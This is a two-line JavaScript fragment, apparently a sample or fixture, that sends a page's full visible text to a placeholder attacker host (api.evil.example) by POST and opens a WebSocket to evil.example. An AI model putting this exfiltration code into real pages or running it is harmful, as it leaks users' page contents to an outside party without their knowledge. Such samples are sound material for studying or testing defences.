fetch('https://api.evil.example/upload', {method: 'POST', body: document.body.innerText});
const ws = new WebSocket('wss://evil.example/s');
